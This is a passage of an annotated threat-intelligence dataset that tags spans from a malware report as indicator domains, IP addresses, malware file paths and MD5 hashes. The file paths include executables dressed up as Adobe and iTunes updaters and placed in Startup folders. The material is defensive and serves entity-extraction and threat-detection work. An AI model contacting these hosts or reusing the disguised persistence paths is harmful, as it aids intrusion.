"sent_id": 14, "type": "Indicator"}], [{"name": "dsds.co.kr", "pos": [2, 3], "sent_id": 14, "type": "Indicator"}], [{"name": "engineer.lflinkup.org", "pos": [2, 3], "sent_id": 15, "type": "Indicator"}], [{"name": "exactearth.info.tm", "pos": [3, 4], "sent_id": 15, "type": "Indicator"}], [{"name": "fbrshop.com", "pos": [4, 5], "sent_id": 15, "type": "Indicator"}], [{"name": "firebirdonline.com", "pos": [5, 6], "sent_id": 15, "type": "Indicator"}], [{"name": "forceoptions.net", "pos": [6, 7], "sent_id": 15, "type": "Indicator"}], [{"name": "freelanceindy.com", "pos": [7, 8], "sent_id": 15, "type": "Indicator"}], [{"name": "ftp.xmahone.ocry.com", "pos": [8, 9], "sent_id": 15, "type": "Indicator"}], [{"name": "garyhart.com", "pos": [0, 1], "sent_id": 16, "type": "Indicator"}], [{"name": "gobroadreach.com", "pos": [1, 2], "sent_id": 16, "type": "Indicator"}], [{"name": "hint.happyforever.com", "pos": [2, 3], "sent_id": 16, "type": "Indicator"}], [{"name": "hojutsu.com", "pos": [0, 1], "sent_id": 17, "type": "Indicator"}], [{"name": "imly.org", "pos": [1, 2], "sent_id": 17, "type": "Indicator"}], [{"name": "interradiology.com", "pos": [2, 3], "sent_id": 17, "type": "Indicator"}], [{"name": "jimnaugle.com", "pos": [3, 4], "sent_id": 17, "type": "Indicator"}], [{"name": "kayauto.net", "pos": [54, 55], "sent_id": 18, "type": "Indicator"}], [{"name": "keenathomas.com", "pos": [55, 56], "sent_id": 18, "type": "Indicator"}], [{"name": "ks.utworld.ch", "pos": [56, 57], "sent_id": 18, "type": "Indicator"}], [{"name": "mast.zyns.com", "pos": [57, 58], "sent_id": 18, "type": "Indicator"}], [{"name": "media.conci.com.au", "pos": [58, 59], "sent_id": 18, "type": "Indicator"}], [{"name": "media.finanstalk.ru", "pos": [59, 60], "sent_id": 18, "type": "Indicator"}], [{"name": "media.metdf.com.au", "pos": [60, 61], "sent_id": 18, "type": "Indicator"}], [{"name": "meeting.toh.info", "pos": [61, 62], "sent_id": 18, "type": "Indicator"}], [{"name": "mountainvalley.americanunfinished.com", "pos": [62, 63], "sent_id": 18, "type": "Indicator"}], [{"name": "mrswehrman.com", "pos": [0, 1], "sent_id": 19, "type": "Indicator"}], [{"name": "mwa.net", "pos": [1, 2], "sent_id": 19, "type": "Indicator"}], [{"name": "news.hqrls.com", "pos": [2, 3], "sent_id": 19, "type": "Indicator"}], [{"name": "odysseus.qs-va.orbcomm.net", "pos": [3, 4], "sent_id": 19, "type": "Indicator"}], [{"name": "ohb-technology.brgh.de", "pos": [4, 5], "sent_id": 19, "type": "Indicator"}], [{"name": "omegalogos.org", "pos": [0, 1], "sent_id": 20, "type": "Indicator"}], [{"name": "pastorsrest.com", "pos": [1, 2], "sent_id": 20, "type": "Indicator"}], [{"name": "portal.itsaol.com", "pos": [2, 3], "sent_id": 20, "type": "Indicator"}], [{"name": "progammerli.com", "pos": [3, 4], "sent_id": 20, "type": "Indicator"}], [{"name": "rbaparts.com", "pos": [4, 5], "sent_id": 20, "type": "Indicator"}], [{"name": "report.crabdance.com", "pos": [5, 6], "sent_id": 20, "type": "Indicator"}], [{"name": "[REMOVED].photo-frame.com", "pos": [0, 4], "sent_id": 21, "type": "Indicator"}], [{"name": "route.cisco.ns01.info", "pos": [4, 5], "sent_id": 21, "type": "Indicator"}], [{"name": "shunleewest.com", "pos": [0, 1], "sent_id": 22, "type": "Indicator"}], [{"name": "slowblog.com", "pos": [1, 2], "sent_id": 22, "type": "Indicator"}], [{"name": "smilecare.com", "pos": [2, 3], "sent_id": 22, "type": "Indicator"}], [{"name": "software.myftp.info", "pos": [3, 4], "sent_id": 22, "type": "Indicator"}], [{"name": "soko.com", "pos": [4, 5], "sent_id": 22, "type": "Indicator"}], [{"name": "tcw.homier.com", "pos": [5, 6], "sent_id": 22, "type": "Indicator"}], [{"name": "[REMOVED]comminc.us.to", "pos": [0, 2], "sent_id": 23, "type": "Indicator"}], [{"name": "[REMOVED].arnotex.com", "pos": [0, 2], "sent_id": 24, "type": "Indicator"}], [{"name": "thecrownsgolf.org", "pos": [2, 3], "sent_id": 24, "type": "Indicator"}], [{"name": "[REMOVED].alfalcons.com", "pos": [0, 2], "sent_id": 25, "type": "Indicator"}], [{"name": "twocirclesmusic.com", "pos": [2, 3], "sent_id": 25, "type": "Indicator"}], [{"name": "un.linuxd.org", "pos": [0, 1], "sent_id": 26, "type": "Indicator"}], [{"name": "update.sektori.org", "pos": [1, 2], "sent_id": 26, "type": "Indicator"}], [{"name": "us.gnpes.org", "pos": [2, 3], "sent_id": 26, "type": "Indicator"}], [{"name": "vwrm.com", "pos": [3, 4], "sent_id": 26, "type": "Indicator"}], [{"name": "woodagency.com", "pos": [4, 5], "sent_id": 26, "type": "Indicator"}], [{"name": "worldnews.kickingdruging.toythieves.com", "pos": [5, 6], "sent_id": 26, "type": "Indicator"}], [{"name": "140.116.70.8", "pos": [11, 12], "sent_id": 27, "type": "Address"}], [{"name": "143.89.35.7", "pos": [12, 13], "sent_id": 27, "type": "Address"}], [{"name": "143.89.35.7", "pos": [12, 13], "sent_id": 27, "type": "Address"}], [{"name": "150.176.164.6", "pos": [0, 1], "sent_id": 28, "type": "Address"}], [{"name": "202.105.39.39", "pos": [1, 2], "sent_id": 28, "type": "Address"}], [{"name": "202.39.61.136", "pos": [2, 3], "sent_id": 28, "type": "Address"}], [{"name": "202.6.235.83", "pos": [3, 4], "sent_id": 28, "type": "Address"}], [{"name": "203.200.205.245", "pos": [0, 1], "sent_id": 29, "type": "Address"}], [{"name": "204.111.73.150", "pos": [1, 2], "sent_id": 29, "type": "Address"}], [{"name": "209.124.51.194", "pos": [57, 58], "sent_id": 30, "type": "Address"}], [{"name": "209.124.51.219", "pos": [0, 1], "sent_id": 31, "type": "Address"}], [{"name": "209.161.249.125", "pos": [1, 2], "sent_id": 31, "type": "Address"}], [{"name": "209.208.114.83", "pos": [2, 3], "sent_id": 31, "type": "Address"}], [{"name": "209.233.16.84", "pos": [3, 4], "sent_id": 31, "type": "Address"}], [{"name": "209.253.17.229", "pos": [0, 1], "sent_id": 32, "type": "Address"}], [{"name": "211.232.57.235", "pos": [1, 2], "sent_id": 32, "type": "Address"}], [{"name": "212.130.19.154", "pos": [2, 3], "sent_id": 32, "type": "Address"}], [{"name": "218.232.66.12", "pos": [3, 4], "sent_id": 32, "type": "Address"}], [{"name": "218.233.206.2", "pos": [0, 1], "sent_id": 33, "type": "Address"}], [{"name": "218.234.17.30", "pos": [1, 2], "sent_id": 33, "type": "Address"}], [{"name": "24.73.192.154", "pos": [2, 3], "sent_id": 33, "type": "Address"}], [{"name": "46.149.18.151", "pos": [3, 4], "sent_id": 33, "type": "Address"}], [{"name": "60.248.52.95", "pos": [4, 5], "sent_id": 33, "type": "Address"}], [{"name": "61.219.67.1", "pos": [5, 6], "sent_id": 33, "type": "Address"}], [{"name": "63.192.38.11", "pos": [0, 1], "sent_id": 34, "type": "Address"}], [{"name": "64.80.153.108", "pos": [1, 2], "sent_id": 34, "type": "Address"}], [{"name": "65.105.157.228", "pos": [2, 3], "sent_id": 34, "type": "Address"}], [{"name": "65.110.1.32", "pos": [3, 4], "sent_id": 34, "type": "Address"}], [{"name": "65.114.195.226", "pos": [0, 1], "sent_id": 35, "type": "Address"}], [{"name": "65.89.173.68", "pos": [1, 2], "sent_id": 35, "type": "Address"}], [{"name": "66.151.16.30", "pos": [2, 3], "sent_id": 35, "type": "Address"}], [{"name": "66.155.114.145", "pos": [3, 4], "sent_id": 35, "type": "Address"}], [{"name": "66.170.3.43", "pos": [0, 1], "sent_id": 36, "type": "Address"}], [{"name": "66.228.132.53", "pos": [1, 2], "sent_id": 36, "type": "Address"}], [{"name": "66.228.132.8", "pos": [2, 3], "sent_id": 36, "type": "Address"}], [{"name": "68.17.104.162", "pos": [3, 4], "sent_id": 36, "type": "Address"}], [{"name": "68.96.31.136", "pos": [4, 5], "sent_id": 36, "type": "Address"}], [{"name": "69.20.5.219", "pos": [5, 6], "sent_id": 36, "type": "Address"}], [{"name": "69.25.50.10", "pos": [6, 7], "sent_id": 36, "type": "Address"}], [{"name": "69.28.168.10", "pos": [0, 1], "sent_id": 37, "type": "Address"}], [{"name": "69.74.43.87", "pos": [0, 1], "sent_id": 38, "type": "Address"}], [{"name": "69.90.123.6", "pos": [1, 2], "sent_id": 38, "type": "Address"}], [{"name": "69.90.18.22", "pos": [0, 1], "sent_id": 39, "type": "Address"}], [{"name": "69.90.18.23", "pos": [0, 1], "sent_id": 40, "type": "Address"}], [{"name": "70.108.241.36", "pos": [0, 1], "sent_id": 41, "type": "Address"}], [{"name": "70.62.232.98", "pos": [0, 1], "sent_id": 42, "type": "Address"}], [{"name": "74.86.197.56", "pos": [1, 2], "sent_id": 42, "type": "Address"}], [{"name": "74.93.92.50", "pos": [2, 3], "sent_id": 42, "type": "Address"}], [{"name": "78.95.63.1", "pos": [0, 1], "sent_id": 43, "type": "Address"}], [{"name": "%TEMP%\\AdobeARM.exe", "pos": [11, 13], "sent_id": 47, "type": "File"}], [{"name": "%TEMP%\\iTunesHelper.exe", "pos": [13, 15], "sent_id": 47, "type": "File"}], [{"name": "%PROGRAMS%\\Startup\\AdobeRe.exe", "pos": [15, 17], "sent_id": 47, "type": "File"}], [{"name": "rouj.exe", "pos": [0, 1], "sent_id": 48, "type": "File"}], [{"name": "%USERPROFILE%\\Local Settings\\iexplore.exe", "pos": [1, 4], "sent_id": 48, "type": "File"}], [{"name": "%USERAPPDATA%\\Microsoft\\wuauclt.exe", "pos": [0, 2], "sent_id": 49, "type": "File"}], [{"name": "%PROGRAMS%\\Startup\\adobeup.exe", "pos": [2, 4], "sent_id": 49, "type": "File"}], [{"name": "%TEMP%\\AdobeUpdater.exe", "pos": [4, 6], "sent_id": 49, "type": "File"}], [{"name": "NTLMSVC.DLL", "pos": [6, 7], "sent_id": 49, "type": "File"}], [{"name": "%PROGRAMS%\\Startup\\adobe_sl.lnk", "pos": [7, 9], "sent_id": 49, "type": "File"}], [{"name": "%TEMP%\\runinfo.exe", "pos": [9, 11], "sent_id": 49, "type": "File"}], [{"name": "00b61db083b07a64fb6072b42aa83dc1", "pos": [0, 1], "sent_id": 52, "type": "MD5"}], [{"name": "0136ab6d2e507d4e63990b196121d41c", "pos": [1, 2], "sent_id": 52, "type": "MD5"}], [{"name": "017c03ad61f89ee6597ead40cc552aef", "pos": [2, 3], "sent_id": 52, "type": "MD5"}], [{"name": "019cb1a6776f0e0d353814711e9e171b", "pos": [3, 4], "sent_id": 52, "type": "MD5"}], [{"name": "02043566d027445374a1f7f0fc35d495", "pos": [0, 1], "sent_id": 53, "type": "MD5"}], [{"name": "025dc68c8e06d6488e338dcc55b295eb", "pos": [0, 1], "sent_id": 54, "type": "MD5"}], [{"name": "026c1532db8125fbae0e6aa1f4033f42", "pos": [0, 1], "sent_id": 55, "type": "MD5"}], [{"name": "02c9a3c3efd52e43dbf53e0995a7a24e", "pos": [1, 2], "sent_id": 55, "type": "MD5"}], [{"name": "051caf12c36662d946fd0146cd199db5", "pos": [2, 3], "sent_id": 55, "type": "MD5"}], [{"name": "05269f5236bd89b66f6f4694abef6222", "pos": [0, 1], "sent_id": 56, "type": "MD5"}], [{"name": "05c63c450d4d2aeb23053a6b6f8275b0", "pos": [0, 1], "sent_id": 57, "type": "MD5"}], [{"name": "05df8d890eb18614a7d206b41453d306", "pos": [1, 2], "sent_id": 57, "type": "MD5"}], [{"name": "086e91fa95136ad1d814cac327543bf9", "pos": [2, 3], "sent_id": 57, "type": "MD5"}], [{"name": "08ac41ce00bf436a3dc23c4639d5f5ed", "pos": [0, 1], "sent_id": 58, "type": "MD5"}], [{"name": "0925fb0f4c06f8b2df86508745dbacb1", "pos": [0, 1], "sent_id": 59, "type": "MD5"}], [{"name": "09a6d5b54e8c48ed33189ebf80df750d", "pos": [0, 1], "sent_id": 60, "type": "MD5"}], [{"name": "09c0f3a3099b6b38ec36d001361edd98", "pos": [0, 1], "sent_id": 61, "type": "MD5"}], [{"name": "0a98bfa4bef1eb755c9c154963b69dc8", "pos": [1, 2], "sent_id": 61, "type": "MD5"}], [{"name": "0aa4e635a61038a621d9264e33b4bc3f", "pos": [2, 3], "sent_id": 61, "type": "MD5"}], [{"name": "0b33a683812124d99de45c8e84dc9013", "pos": [0, 1], "sent_id": 62, "type": "MD5"}], [{"name": "0b6755e61840378952d69630b5c23e41", "pos": [1, 2], "sent_id": 62, "type": "MD5"}], [{"name": "0c6f8665dd18d5e86124c7bfbf3207f0", "pos": [2, 3], "sent_id": 62, "type": "MD5"}], [{"name": "0cdfea216d117cc97845edb9becaa498", "pos": [0, 1], "sent_id": 63, "type": "MD5"}], [{"name": "0d335de3c082627cd0c5699aa6012b7d", "pos": [0, 1], "sent_id": 64, "type": "MD5"}], [{"name": "0f1dd1bef76967a6b06a5e0432ca947b", "pos": [15, 16], "sent_id": 66, "type": "MD5"}], [{"name": "0f4432d54b28aafc976b5950d5337a5f", "pos": [16, 17], "sent_id": 66, "type": "MD5"}], [{"name": "1285ff3c3a4089b43c275220d0c54442", "pos": [0, 1], "sent_id": 67, "type": "MD5"}], [{"name": "1286c678b3a821dec8c8cc1125bd2bc0", "pos": [1, 2], "sent_id": 67, "type": "MD5"}], [{"name": "12c64a64ae32fd3dff75347dde2aafac", "pos": [0, 1], "sent_id": 68, "type": "MD5"}], [{"name": "13eb87290affe1360834037d9d400b39", "pos": [1, 2], "sent_id": 68, "type": "MD5"}], [{"name": "1475f178b6a86d3922b3e2c6fc59512d", "pos": [2, 3], "sent_id": 68, "type": "MD5"}], [{"name": "14d17aaa3016a618a3ede92511fdd339", "pos": [0, 1], "sent_id": 69, "type": "MD5"}], [{"name": "16710c96d5ee6554bae6b881d9e136bd", "pos": [1, 2], "sent_id": 69, "type": "MD5"}], [{"name": "17173efe0062114d2f993c7584520c1a", "pos": [2, 3], "sent_id": 69, "type": "MD5"}], [{"name": "18575542dc4e9aa5aa8eeda14c26e46a", "pos": [3, 4], "sent_id": 69, "type": "MD5"}], [{"name": "18a3bf5d8336f075ba503622880b5025", "pos": [0, 1], "sent_id": 70, "type": "MD5"}], [{"name": "19bc509f31f33a8f473ef9d671c1828b", "pos": [0, 1], "sent_id": 71, "type": "MD5"}], [{"name": "1b517ea2aae0ed0a71f6e74e34e860e1", "pos": [0, 1], "sent_id": 72, "type": "MD5"}], [{"name": "1bc363e4ad9fc3be4953dd3eaa2bdb76", "pos": [1, 2], "sent_id": 72, "type": "MD5"}], [{"name": "1d1e2c7bb5a9fa546a6b0ae3c308db61", "pos": [2, 3], "sent_id": 72, "type": "MD5"}], [{"name": "1d69504a3d3ac32275fa4df8af25d1f7", "pos": [3, 4], "sent_id": 72, "type": "MD5"}], [{"name": "1ee30f7ecaf25af38cf684ca56b75cf2", "pos": [4, 5], "sent_id": 72, "type": "MD5"}], [{"name": "1f9cf9f1b5738198674a58a378b0d7e1", "pos": [5, 6], "sent_id": 72, "type": "MD5"}], [{"name": "218bbd007898e6b6fc754fe5c76668fc", "pos": [6, 7], "sent_id": 72, "type": "MD5"}], [{"name": "21ed762e867cdabbb194aba878530c88", "pos": [7, 8], "sent_id": 72, "type": "MD5"}], [{"name": "22e10cbe46f406f5f1be0d613db4c2c3", "pos": [8, 9], "sent_id": 72, "type": "MD5"}], [{"name": "241e8465fd4d99a3f446d7f75957522b", "pos": [0, 1], "sent_id": 73, "type": "MD5"}], [{"name": "24be0dd53bb43bb6cd08044b21a6aaaa", "pos": [1, 2], "sent_id": 73, "type": "MD5"}], [{"name": "2500494616f4e7e1fa14fb3a46f468a7", "pos": [2, 3], "sent_id": 73, "type": "MD5"}], [{"name": "255b1aaff69668ac19906219d36c607c", "pos": [0, 1], "sent_id": 74, "type": "MD5"}], [{"name": "271dad1471efd9bfc1a9dc05d6c30a24", "pos": [1, 2], "sent_id": 74, "type": "MD5"}], [{"name": "27fb01f7b3137921126ba086da4e6a2c", "pos": [2, 3], "sent_id": 74, "type": "MD5"}], [{"name": "280531bb85998ff3dc7eb8d057525ffe", "pos": [3, 4], "sent_id": 74, "type": "MD5"}], [{"name": "2997ec540932ea6b1fe0cab555b939d8", "pos": [4, 5], "sent_id": 74, "type": "MD5"}], [{"name": "299ca1f787d2340d34407ef084845260", "pos": [5, 6], "sent_id": 74, "type": "MD5"}], [{"name": "2a3aca1b002c6894c5edcc5e25a8f970", "pos": [6, 7], "sent_id": 74, "type": "MD5"}], [{"name": "2b3faf2856c220aa8b87632ac8bbd1a5", "pos": [0, 1], "sent_id": 75, "type": "MD5"}], [{"name": "2c4cabb4ca19ddf87c7f11bad44bdf05", "pos": [0, 1], "sent_id": 76, "type": "MD5"}], [{"name": "2cf5b5a9333d159b664725811465d1a3", "pos": [1, 2], "sent_id": 76, "type": "MD5"}], [{"name": "2d0318507bc4c1958913b31009de37f8", "pos": [2, 3], "sent_id": 76, "type": "MD5"}], [{"name": "2dbbadc147f11f2a856a648cdc332c0e", "pos": [3, 4], "sent_id": 76, "type": "MD5"}], [{"name": "2e7a8e7e9d8d62c94d011e86de9cb12a", "pos": [4, 5], "sent_id": 76, "type": "MD5"}], [{"name": "2f37912e7cb6e5c478e6dc3d0e381a24", "pos": [0, 1], "sent_id": 77, "type": "MD5"}], [{"name": "2f6c8da1c5f397bea7b300d28b3ad4ba", "pos": [0, 1], "sent_id": 78, "type": "MD5"}], [{"name": "2f7918548b0aa59f23a1c16aa98e058b", "pos": [0, 1], "sent_id": 79, "type": "MD5"}], [{"name": "30e81a30471c8f63b4688533252b56fa", "pos": [1, 2], "sent_id": 79, "type": "MD5"}], [{"name": "320b4bd876004c1f0455f6f48b07e164", "pos": [0, 1], "sent_id": 80, "type": "MD5"}], [{"name": "32e474b21555d3946970c73648d88b36", "pos": [0, 1], "sent_id": 81, "type": "MD5"}], [{"name": "33a03ca462cec85e33dba0a1dcb9aee0", "pos": [1, 2], "sent_id": 81, "type": "MD5"}], [{"name": "356e11813fed7623a77610e836bcab65", "pos": [0, 1], "sent_id": 82, "type": "MD5"}], [{"name": "3599a78c7e99b451c00d3490f17f842f", "pos": [1, 2], "sent_id": 82, "type": "MD5"}], [{"name": "35ae79bbe9f560b9634ce28b6569bd0f", "pos": [2, 3], "sent_id": 82, "type": "MD5"}], [{"name": "35ed31733fbd7eeb4bfcc29e28a8496f", "pos": [3, 4], "sent_id": 82, "type": "MD5"}], [{"name": "36ca00585d13d6911f086f0d2d496f96", "pos": [4, 5], "sent_id": 82, "type": "MD5"}], [{"name": "370947e6c802d21a732ac0cc024c4fcf", "pos": [0, 1], "sent_id": 83, "type": "MD5"}], [{"name": "37b1e5809dd5a92a1d73f0e36af6791e", "pos": [1, 2], "sent_id": 83, "type": "MD5"}], [{"name": "399c41047abd99b6e86d04b7dd444509", "pos": [0, 1], "sent_id": 84, "type": "MD5"}], [{"name": "3b266b165468b810cd456cdf88ca8619", "pos": [0, 1], "sent_id": 85, "type": "MD5"}], [{"name": "3b6a1f6ad4b8141b1aed8644d789706f", "pos": [1, 2], "sent_id": 85, "type": "MD5"}], [{"name": "3b8ada8eda04f204164449a0fec0c296", "pos": [15, 16], "sent_id": 86, "type": "MD5"}], [{"name": "3b9cc9e174ad19380efef2744b7ff046", "pos": [16, 17], "sent_id": 86, "type": "MD5"}], [{"name": "3c058ca758f97cd2ae56df8a08f6a5a3", "pos": [0, 1], "sent_id": 87, "type": "MD5"}], [{"name": "3c9aa6dc8c4501ffa2798f044df53438", "pos": [1, 2], "sent_id": 87, "type": "MD5"}], [{"name": "3ce55c6994101faec00b5b7c2fee494f", "pos": [0, 1], "sent_id": 88, "type": "MD5"}], [{"name": "3d41375ee362f4265ea2e90b9a08f0dd", "pos": [1, 2], "sent_id": 88, "type": "MD5"}], [{"name": "3f637c1477442d92962be4ed427bb1cd", "pos": [2, 3], "sent_id": 88, "type": "MD5"}], [{"name": "3f9e63ee4ae254778c69369fedf0d999", "pos": [3, 4], "sent_id": 88, "type": "MD5"}], [{"name": "3fb6039a572369d8d23fb99987ea21a9", "pos": [0, 1], "sent_id": 89, "type": "MD5"}], [{"name": "3fc2aa493492e6d7560ac8a5d69d7cbd", "pos": [1, 2], "sent_id": 89, "type": "MD5"}], [{"name": "3fecd601404abda8f793ff5cc7ecf973", "pos": [0, 1], "sent_id": 90, "type": "MD5"}], [{"name": "41998b32ab11e474b167edf9dbb59b12", "pos": [0, 1], "sent_id": 91, "type": "MD5"}], [{"name": "4248d33b4273a80d11d6b3b6297851eb", "pos": [0, 1], "sent_id": 92, "type": "MD5"}], [{"name": "4287353240e4e473e940a9289a48a333", "pos": [0, 1], "sent_id": 93, "type": "MD5"}], [{"name": "42acd0ed699d94602a0494f65a328615", "pos": [0, 1], "sent_id": 94, "type": "MD5"}], [{"name": "431f635eb68b936182d73bf6db06fc97", "pos": [1, 2], "sent_id": 94, "type": "MD5"}], [{"name": "43e128cfd0080a644e4ce98f84e29e8e", "pos": [0, 1], "sent_id": 95, "type": "MD5"}], [{"name": "43f3a0a82397400a181c080992d35a5b", "pos": [0, 1], "sent_id": 96, "type": "MD5"}], [{"name": "4602735e4a8754ff7f5a8785f9fd336a", "pos": [0, 1], "sent_id": 97, "type": "MD5"}], [{"name": "467b90773754e35e1535a164140be005", "pos": [0, 1], "sent_id": 98, "type": "MD5"}], [{"name": "46b3b305530fb68f7a88b8453e4866ea", "pos": [1, 2], "sent_id": 98, "type": "MD5"}], [{"name": "4890bf4c2d68657969e1cd11e0ae2648", "pos": [0, 1], "sent_id": 99, "type": "MD5"}], [{"name": "4899aa64923115886dd7cff5fff5ea1c", "pos": [1, 2], "sent_id": 99, "type": "MD5"}], [{"name": "491db327f479a1a34898229811fa8a5d", "pos": [2, 3], "sent_id": 99, "type": "MD5"}], [{"name": "49cc5f649e9098530ceeb2ea45346a9d", "pos": [3, 4], "sent_id": 99, "type": "MD5"}], [{"name": "4b03db464b22536f700c99c3bd36e9e2", "pos": [0, 1], "sent_id": 100, "type": "MD5"}], [{"name": "4c136f1fbd9d7010369ae5644a8af4b0", "pos": [0, 1], "sent_id": 101, "type": "MD5"}], [{"name": "4cd5a29a7fc904aaaccbca9e30e0a865", "pos": [0, 1], "sent_id": 102, "type": "MD5"}], [{"name": "4cdfb56105b07f463d046fb425567cb0", "pos": [1, 2], "sent_id": 102, "type": "MD5"}], [{"name": "4ce22cee6abcb37db757e3fd60970090", "pos": [2, 3], "sent_id": 102, "type": "MD5"}], [{"name": "4dc2bcad31fb36f0913e441deeda8121", "pos": [3, 4], "sent_id": 102, "type": "MD5"}], [{"name": "4e5ed120295d9937de106fc703e64732", "pos": [0, 1], "sent_id": 103, "type": "MD5"}], [{"name": "4f13bd1db43e54d2cd2427a87ddb8e22", "pos": [1, 2], "sent_id": 103, "type": "MD5"}], [{"name": "507fa8a735417219d6b881834f660cb2", "pos": [2, 3], "sent_id": 103, "type": "MD5"}], [{"name": "5084ddfb90791516015c02c68d58fe5d", "pos": [3, 4], "sent_id": 103, "type": "MD5"}], [{"name": "5106b19a9a29f0228782e0cafcd1cc2e", "pos": [0, 1], "sent_id": 104, "type": "MD5"}], [{"name": "516c2981f3506ede7608ef2f273c6aed", "pos": [1, 2], "sent_id": 104, "type": "MD5"}], [{"name": "534b3650b350b503e0f0f3bb6dd7598c", "pos": [0, 1], "sent_id": 105, "type": "MD5"}], [{"name": "53d1e354104d5fc028d83aa519c1d1c6", "pos": [1, 2], "sent_id": 105, "type": "MD5"}], [{"name": "551aa0ab2b40fa7d891664caf0da879b", "pos": [0, 1], "sent_id": 106, "type": "MD5"}], [{"name": "5621ed9c3b844654141c1a5ea7ca8c0d", "pos": [0, 1], "sent_id": 107, "type": "MD5"}], [{"name": "578dbadaa5086e24d576328b7d4fedba", "pos": [1, 2], "sent_id": 107, "type": "MD5"}], [{"name": "57bc1531a12179c5794d5c99b8442eba", "pos": [2, 3], "sent_id": 107, "type": "MD5"}], [{"name": "582207d1f939f80bacc36a7790f40dc8", "pos": [0, 1], "sent_id": 108, "type": "MD5"}], [{"name": "582e827a539b6243f1c90b720fc143a4", "pos": [0, 1], "sent_id": 109, "type": "MD5"}], [{"name": "5aea3a20553a07fa50c4e815cf9ba7ff", "pos": [0, 1], "sent_id": 110, "type": "MD5"}], [{"name": "5afdb5db234a1a13f5449be25f114999", "pos": [0, 1], "sent_id": 111, "type": "MD5"}], [{"name": "5ba8c4ef080e61310943fcb3c68bf002", "pos": [0, 1], "sent_id": 112, "type": "MD5"}], [{"name": "5bdb1b2313541f4cdc967391a4d150f4", "pos": [0, 1], "sent_id": 113, "type": "MD5"}], [{"name": "5c43e4ac0a6ad74844b2a310f1abc1c7", "pos": [1, 2], "sent_id": 113, "type": "MD5"}], [{"name": "5ca21c7986db58d44306e94f1ea6ae5c", "pos": [0, 1], "sent_id": 114, "type": "MD5"}], [{"name": "5d1d18c697eefb03e120d9ef3f53dd28", "pos": [1, 2], "sent_id": 114, "type": "MD5"}], [{"name": "5e8d1334238dfaf5f11d7f2186989095", "pos": [0, 1], "sent_id": 115, "type": "MD5"}], [{"name": "5fee0adbac53eee82626daa5c5f99aba", "pos": [1, 2], "sent_id": 115, "type": "MD5"}], [{"name": "607b46c73adb9a8bf03f5cd038871347", "pos": [0, 1], "sent_id": 116, "type": "MD5"}], [{"name": "628e4933864d3f712670658a93d11113", "pos": [15, 16], "sent_id": 117, "type": "MD5"}], [{"name": "62ccc75782d657850b85456ab48f2277", "pos": [0, 1], "sent_id": 118, "type": "MD5"}], [{"name": "633d92d13c2e8330cb4a3bc5130ab84f", "pos": [0, 1], "sent_id": 119, "type": "MD5"}], [{"name": "640a64136516298ca80490d75a365695", "pos": [1, 2], "sent_id": 119, "type": "MD5"}], [{"name": "640fbb5f8938ea45204de6496240f82a", "pos": [0, 1], "sent_id": 120, "type": "MD5"}], [{"name": "6414217bafb6f4c058773b0134e56e99", "pos": [0, 1], "sent_id": 121, "type": "MD5"}], [{"name": "64b865afdc34091a9c02700adeea5853", "pos": [1, 2], "sent_id": 121, "type": "MD5"}], [{"name": "655d1322795ed9532390ccf2e8f726f8", "pos": [2, 3], "sent_id": 121, "type": "MD5"}], [{"name": "659300af2f7c9e76f55464b21784a7f6", "pos": [0, 1], "sent_id": 122, "type": "MD5"}], [{"name": "659fb07c70034571de7a1b4b5ac86b01", "pos": [0, 1], "sent_id": 123, "type": "MD5"}], [{"name": "66060b82f299c14e18b65d21d277a49e", "pos": [0, 1], "sent_id": 124, "type": "MD5"}], [{"name": "668731574fa9ad7567fb4854805a3fb2", "pos": [1, 2], "sent_id": 124, "type": "MD5"}], [{"name": "66e4538702381035dc62247080d4593f", "pos": [0, 1], "sent_id": 125, "type": "MD5"}], [{"name": "6757128a636e2c509861d4f75ff128f1", "pos": [1, 2], "sent_id": 125, "type": "MD5"}], [{"name": "67a8b964857fe499b62442308a767e94", "pos": [0, 1], "sent_id": 126, "type": "MD5"}], [{"name": "6827e494a230a1483e19c205c532df17", "pos": [1, 2], "sent_id": 126, "type": "MD5"}], [{"name": "685e10f1393eaee470224b7fe1359202", "pos": [2, 3], "sent_id": 126, "type": "MD5"}], [{"name": "688ba2b3739ad54dee4139a727e457cc", "pos": [0, 1], "sent_id": 127, "type": "MD5"}], [{"name": "6981364b6f1142363c151b11da66cc98", "pos": [0, 1], "sent_id": 128, "type": "MD5"}], [{"name": "6993ed604acd3e17a7bafcfdc2b27898", "pos": [1, 2], "sent_id": 128, "type": "MD5"}], [{"name": "6a0280f169d233a0bdc81ee6a70ef817", "pos": [0, 1], "sent_id": 129, "type": "MD5"}], [{"name": "6b8585ffbdf90c9b120ac1a79fa4dc51", "pos": [1, 2], "sent_id": 129, "type": "MD5"}], [{"name": "6bc6bacbbbacf369fea145d9044bd863", "pos": [0, 1], "sent_id": 130, "type": "MD5"}], [{"name": "6c5b2712a66db42b960aef5b87590033", "pos": [1, 2], "sent_id": 130, "type": "MD5"}], [{"name": "6e67fc27a49769f5218824d405d8fce5", "pos": [2, 3], "sent_id": 130, "type": "MD5"}], [{"name": "6f1c70d77e2571fe8a402aa1a8b7e8cd", "pos": [3, 4], "sent_id": 130, "type": "MD5"}], [{"name": "6fd6aa2a4038903ed6d8e5771689f7c1", "pos": [0, 1], "sent_id": 131, "type": "MD5"}], [{"name": "700941e4fa44941b18844c9bfb3474dc", "pos": [1, 2], "sent_id": 131, "type": "MD5"}], [{"name": "70320b5c719c70c860a55cec7ef173e8", "pos": [2, 3], "sent_id": 131, "type": "MD5"}], [{"name": "709d6eff31854fad212f83a91a900920", "pos": [3, 4], "sent_id": 131, "type": "MD5"}], [{"name": "70fef3c8073e97980b60b4ad8388ab5d", "pos": [0, 1], "sent_id": 132, "type": "MD5"}], [{"name": "716978305d76e1e458c480d80f24caca", "pos": [1, 2], "sent_id": 132, "type": "MD5"}], [{"name": "718179479dd9bd93beae66665e452c87", "pos": [2, 3], "sent_id": 132, "type": "MD5"}], [{"name": "718fcf2a80348110f519a000854e9e0e", "pos": [3, 4], "sent_id": 132, "type": "MD5"}], [{"name": "71de04a952f8c09243c15a7fa5371073", "pos": [4, 5], "sent_id": 132, "type": "MD5"}], [{"name": "71fd3ea6c3e7e2f1eba9d7e911b1cffe", "pos": [0, 1], "sent_id": 133, "type": "MD5"}], [{"name": "7228ac8f341f6ecaff45c8163f421f14", "pos": [1, 2], "sent_id": 133, "type": "MD5"}], [{"name": "76000c77ea9a214f5b2ae8cc387809db", "pos": [2, 3], "sent_id": 133, "type": "MD5"}], [{"name": "7715864443576c824cdc9f39ffacd9dc", "pos": [3, 4], "sent_id": 133, "type": "MD5"}], [{"name": "7b81fa4334cf0e520269f5484fef9fca", 